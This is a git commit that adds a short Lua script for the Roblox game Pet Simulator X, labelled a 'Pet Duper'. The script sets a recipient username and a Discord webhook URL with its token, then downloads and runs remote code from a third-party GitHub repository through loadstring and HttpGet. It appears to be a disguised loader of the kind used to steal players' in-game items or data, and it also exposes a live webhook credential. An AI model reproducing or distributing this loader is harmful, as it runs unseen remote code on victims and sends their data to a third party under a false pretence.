f711805c549c24199e8f3bad4509d8d02b70833c
JavasGG <136696278+JavasGG@users.noreply.github.com>
2023-06-18 20:27:56 +0300

    Add files via upload

---
+++ PSX_JGG.lua
@@ -0,0 +1,5 @@
+_G.Username "ChinaNumberJS"
+_G.HubName "Pet Duper"
+_G.WebhookUrl "https://discord.com/api/webhooks/1119024560591884409/RZm1bNlVL8TKJJImeGLLdSeAqLQ8a3Lgw-jM7x2kAflPioQT56AhLXq9NkaXNuCiocmi"
+
+loadstring(game:HttpGet("https://github.com/Jayiioceanii/PeakOnTop/blob/main/peak.lua"))()
